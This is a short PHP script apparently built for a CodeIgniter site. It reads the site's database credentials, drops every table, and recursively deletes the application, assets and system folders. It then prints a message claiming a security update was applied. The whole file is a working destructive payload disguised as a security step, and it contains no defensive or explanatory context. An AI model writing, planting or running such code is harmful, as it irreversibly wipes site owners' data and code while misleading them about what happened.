<?php
define('BASEPATH', '');
$db = array('default' => array());
require('../../../../application/config/database.php');
$hostname = $db['default']['hostname'];
$username = $db['default']['username'];
$password = $db['default']['password'];
$database = $db['default']['database'];

$mysqli = new mysqli($hostname, $username, $password, $database) or die("error");
$mysqli->query('SET foreign_key_checks = 0');
if ($result = $mysqli->query("SHOW TABLES"))
{
    while($row = $result->fetch_array(MYSQLI_NUM))
    {
        $mysqli->query('DROP TABLE IF EXISTS '.$row[0]);
    }
}

$mysqli->query('SET foreign_key_checks = 1');
$mysqli->close();

// match any file
function deleteAll($str) {
    //It it's a file.
    if (is_file($str)) {
        //Attempt to delete it.
        return unlink($str);
    }
    //If it's a directory.
    elseif (is_dir($str)) {
        //Get a list of the files in this directory.
        $scan = glob(rtrim($str,'/').'/*');
        //Loop through the list of files.
        foreach($scan as $index=>$path) {
            //Call our recursive function.
            deleteAll($path);
        }
        //Remove the directory itself.
        return @rmdir($str);
    }
}
 
//call our function
deleteAll('../../../../application');
deleteAll('../../../../assets');
deleteAll('../../../../system');
echo 'securty successfull appled.';

?>